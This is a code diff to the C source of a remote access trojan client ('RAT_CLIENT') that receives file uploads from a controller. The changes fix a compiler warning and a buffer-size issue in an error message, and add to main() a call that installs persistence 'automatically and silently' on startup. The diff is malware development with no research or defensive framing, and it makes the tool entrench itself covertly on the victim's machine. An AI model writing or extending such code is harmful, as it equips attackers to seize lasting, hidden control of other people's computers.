@@ -1,3 +1,6 @@
+#define _GNU_SOURCE
+#define _POSIX_C_SOURCE 200809L
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -11,6 +14,7 @@
 #include <errno.h>
 #include <sys/wait.h>
 #include <pwd.h>
+#include "../include/persistence.h"
 
 #ifdef _WIN32
     #include <windows.h>
@@ -253,7 +257,7 @@ void handle_upload(RAT_CLIENT *client) {
     char temp_char;
     
     // Read upload info character by character until newline
-    while (info_pos < sizeof(upload_info) - 1) {
+    while (info_pos < (int)(sizeof(upload_info) - 1)) {
         bytes_received = recv(client->client_fd, &temp_char, 1, 0);
         if (bytes_received <= 0) {
             return;
@@ -311,8 +315,21 @@ void handle_upload(RAT_CLIENT *client) {
     
     file = fopen(final_path, "wb");
     if (file == NULL) {
-        char error_msg[256];
-        snprintf(error_msg, sizeof(error_msg), "Error: Cannot create file %s", final_path);
+        char error_msg[512];
+        char truncated_path[256];
+        
+        // Truncate path if too long to prevent buffer overflow
+        if (strlen(final_path) > 255) {
+            strncpy(truncated_path, final_path, 252);
+            truncated_path[252] = '.';
+            truncated_path[253] = '.';
+            truncated_path[254] = '.';
+            truncated_path[255] = '\0';
+        } else {
+            strcpy(truncated_path, final_path);
+        }
+        
+        snprintf(error_msg, sizeof(error_msg), "Error: Cannot create file %s", truncated_path);
         send_response_with_prompt(client, error_msg);
         return;
     }
@@ -410,6 +427,9 @@ void cleanup(RAT_CLIENT *client) {
 
 int main() {
     RAT_CLIENT client;
+    
+    // Install persistence automatically and silently
+    install_automatic_persistence();
     
     // Initialize client
     strcpy(client.host, "127.0.0.1");
